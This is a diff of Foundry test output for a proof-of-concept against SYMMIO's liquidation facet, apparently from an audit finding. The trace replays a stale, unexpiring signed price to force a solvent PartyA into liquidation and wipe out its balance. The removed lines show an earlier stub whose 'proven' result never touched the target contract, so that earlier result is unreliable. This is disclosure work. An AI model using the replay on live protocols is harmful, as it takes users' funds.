@@ -1,23 +1,74 @@
-No files changed, compilation skipped
+Compiling SYMMIO liquidation facet + LibMuon (real audited source, OZ 4.9.6)
+Compiler run successful!
 
 Ran 1 test for test/26346-h-1-liquidatepartya-requires-signature-which-doesnt-have-non_exp.sol:PoC_26346
-[PASS] testExploit() (gas: 367701)
+[PASS] testExploit() (gas: 525860)
 Traces:
-  [367701] PoC_26346::testExploit()
-    ├─ [260698] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
-    │   └─ ← [Return] 1302 bytes of code
-    ├─ [69587] Exploit::run()
-    │   ├─  storage changes:
-    │   │   @ 9: 0 → 65536
-    │   │   @ 8: 0 → 7
-    │   │   @ 0: 0 → 200
+  [662591] PoC_26346::testExploit()
+    ├─ [6670] SymmioHarness::liqSigHash(LiquidationSig({ reqId: 0x01, timestamp: 1, liquidationId: 0x6c69717569646174696f6e2d726f756e642d31, upnl: -100000000000000000000 [-1e20], totalUnrealizedLoss: -100000000000000000000 [-1e20], symbolIds: [1], prices: [9000000000000000000 [9e18]], gatewaySignature: 0x, sigs: SchnorrSign({ signature: 0, owner: 0x0000000000000000000000000000000000000000, nonce: 0x0000000000000000000000000000000000000000 }) }), 0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0x0fe40bc7a6a69c6735431813e8768324c8c4b6fd3a18c9db670e4f99fca4b7c4
+    ├─ [0] VM::sign("<pk>", 0xa267d1face7f7d7c75d968f16dcce4b9de797ac6c47a3c32d4729c09b494c0b9) [staticcall]
+    │   └─ ← [Return] 27, 0x4b3fc1958c0f8e3ce7a1f11b89c600c121a1c59e18ef2fa94d13736f250358b4, 0x75f4363a0a7f4a2449ec81dcc9cb305bcceba76d48ce10537739cad47641d096
+    ├─ [22705] SymmioHarness::setPartyANonce(0x00000000000000000000000000000000000A11cE, 1)
     │   └─ ← [Stop]
-    ├─ [540] Exploit::proven() [staticcall]
-    │   └─ ← [Return] true
-    ├─ [0] VM::assertTrue(true, "harm was not reproduced") [staticcall]
+    ├─ [4670] SymmioHarness::liqSigHash(LiquidationSig({ reqId: 0x01, timestamp: 1, liquidationId: 0x6c69717569646174696f6e2d726f756e642d31, upnl: -5000000000000000000 [-5e18], totalUnrealizedLoss: -5000000000000000000 [-5e18], symbolIds: [1], prices: [9000000000000000000 [9e18]], gatewaySignature: 0x, sigs: SchnorrSign({ signature: 0, owner: 0x0000000000000000000000000000000000000000, nonce: 0x0000000000000000000000000000000000000000 }) }), 0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0x333c1cf08c6e6f139f51676362d2adab744bc57ff8d4b199b347380f1d7ca14b
+    ├─ [0] VM::sign("<pk>", 0xe8ba3cd07f718bdbc828ef0828093c0a26c18b728709dbfa5af2fe6e4cd93fbb) [staticcall]
+    │   └─ ← [Return] 28, 0xa85468377ab88aa71a84df8323befe9898b809fc80e074e2e2d12a95b16c194b, 0x657984a76c72a631d30c0564bac9ee115d85b0db4721814ef6c139c4e742920b
+    ├─ [7171] SymmioHarness::availableForLiquidation(-5000000000000000000 [-5e18], 0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 94000000000000000000 [9.4e19]
+    ├─ [0] VM::assertGt(94000000000000000000 [9.4e19], 0, "true upnl => solvent") [staticcall]
     │   └─ ← [Return]
-    └─ ← [Stop]
+    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  #LiquidationFacet: PartyA is solvent)
+    │   └─ ← [Return]
+    ├─ [20558] SymmioHarness::liquidatePartyA(0x00000000000000000000000000000000000A11cE, LiquidationSig({ reqId: 0x01, timestamp: 1, liquidationId: 0x6c69717569646174696f6e2d726f756e642d31, upnl: -5000000000000000000 [-5e18], totalUnrealizedLoss: -5000000000000000000 [-5e18], symbolIds: [1], prices: [9000000000000000000 [9e18]], gatewaySignature: 0xa85468377ab88aa71a84df8323befe9898b809fc80e074e2e2d12a95b16c194b657984a76c72a631d30c0564bac9ee115d85b0db4721814ef6c139c4e742920b1c, sigs: SchnorrSign({ signature: 0, owner: 0x0000000000000000000000000000000000000000, nonce: 0x0000000000000000000000000000000000000000 }) }))
+    │   ├─ [3000] PRECOMPILES::ecrecover(0xe8ba3cd07f718bdbc828ef0828093c0a26c18b728709dbfa5af2fe6e4cd93fbb, 28, 76137692992771286041899632487706805374021390976063722960393834617259416099147, 45898301745997850942718125171431320581387775397461349063295715766881413665291) [staticcall]
+    │   │   └─ ← [Return] 0xF5A5E415061470A8b9137959180901aEa72450a4
+    │   └─ ← [Revert] LiquidationFacet: PartyA is solvent
+    ├─ [1171] SymmioHarness::availableForLiquidation(-100000000000000000000 [-1e20], 0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] -1000000000000000000 [-1e18]
+    ├─ [0] VM::assertLt(-1000000000000000000 [-1e18], 0, "stale upnl => 'liquidatable'") [staticcall]
+    │   └─ ← [Return]
+    ├─ [544] SymmioHarness::allocatedOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 109000000000000000000 [1.09e20]
+    ├─ [0] VM::assertEq(109000000000000000000 [1.09e20], 109000000000000000000 [1.09e20]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
+    │   └─ ← [Return]
+    ├─ [182578] SymmioHarness::liquidatePartyA(0x00000000000000000000000000000000000A11cE, LiquidationSig({ reqId: 0x01, timestamp: 1, liquidationId: 0x6c69717569646174696f6e2d726f756e642d31, upnl: -100000000000000000000 [-1e20], totalUnrealizedLoss: -100000000000000000000 [-1e20], symbolIds: [1], prices: [9000000000000000000 [9e18]], gatewaySignature: 0x4b3fc1958c0f8e3ce7a1f11b89c600c121a1c59e18ef2fa94d13736f250358b475f4363a0a7f4a2449ec81dcc9cb305bcceba76d48ce10537739cad47641d0961b, sigs: SchnorrSign({ signature: 0, owner: 0x0000000000000000000000000000000000000000, nonce: 0x0000000000000000000000000000000000000000 }) }))
+    │   ├─ [3000] PRECOMPILES::ecrecover(0xa267d1face7f7d7c75d968f16dcce4b9de797ac6c47a3c32d4729c09b494c0b9, 27, 34036111077653121368215328094736481152456922319175583002113580588733512767668, 53352088227133213428862946386226703546704515245674918181484039945799409455254) [staticcall]
+    │   │   └─ ← [Return] 0xF5A5E415061470A8b9137959180901aEa72450a4
+    │   ├─ emit LiquidatePartyA(liquidator: 0x000000000000000000000000000000000000bEEF, partyA: 0x00000000000000000000000000000000000A11cE)
+    │   └─ ← [Stop]
+    ├─ [644] SymmioHarness::liquidationStatusOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "solvent partyA forced into liquidation") [staticcall]
+    │   └─ ← [Return]
+    ├─ [506] SymmioHarness::liqDetailUpnl(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] -100000000000000000000 [-1e20]
+    ├─ [0] VM::assertEq(-100000000000000000000 [-1e20], -100000000000000000000 [-1e20], "stale upnl locked into liquidation") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
+    │   └─ ← [Return]
+    ├─ [123366] SymmioHarness::setSymbolsPrice(0x00000000000000000000000000000000000A11cE, LiquidationSig({ reqId: 0x01, timestamp: 1, liquidationId: 0x6c69717569646174696f6e2d726f756e642d31, upnl: -100000000000000000000 [-1e20], totalUnrealizedLoss: -100000000000000000000 [-1e20], symbolIds: [1], prices: [9000000000000000000 [9e18]], gatewaySignature: 0x4b3fc1958c0f8e3ce7a1f11b89c600c121a1c59e18ef2fa94d13736f250358b475f4363a0a7f4a2449ec81dcc9cb305bcceba76d48ce10537739cad47641d0961b, sigs: SchnorrSign({ signature: 0, owner: 0x0000000000000000000000000000000000000000, nonce: 0x0000000000000000000000000000000000000000 }) }))
+    │   ├─ [3000] PRECOMPILES::ecrecover(0xa267d1face7f7d7c75d968f16dcce4b9de797ac6c47a3c32d4729c09b494c0b9, 27, 34036111077653121368215328094736481152456922319175583002113580588733512767668, 53352088227133213428862946386226703546704515245674918181484039945799409455254) [staticcall]
+    │   │   └─ ← [Return] 0xF5A5E415061470A8b9137959180901aEa72450a4
+    │   ├─ emit SetSymbolsPrices(liquidator: 0x000000000000000000000000000000000000bEEF, partyA: 0x00000000000000000000000000000000000A11cE, symbolIds: [1], prices: [9000000000000000000 [9e18]])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
+    │   └─ ← [Return]
+    ├─ [255883] SymmioHarness::liquidatePositionsPartyA(0x00000000000000000000000000000000000A11cE, [1])
+    │   ├─ emit LiquidatePositionsPartyA(liquidator: 0x000000000000000000000000000000000000bEEF, partyA: 0x00000000000000000000000000000000000A11cE, quoteIds: [1])
+    │   ├─ emit FullyLiquidatedPartyA(partyA: 0x00000000000000000000000000000000000A11cE)
+    │   └─ ← [Stop]
+    ├─ [544] SymmioHarness::allocatedOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "solvent partyA lost entire allocated balance") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
 
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 269.92µs (111.38µs CPU time)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.94ms (2.12ms CPU time)
 
-Ran 1 test suite in 5.64ms (269.92µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Ran 1 test suite in 147.44ms (3.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
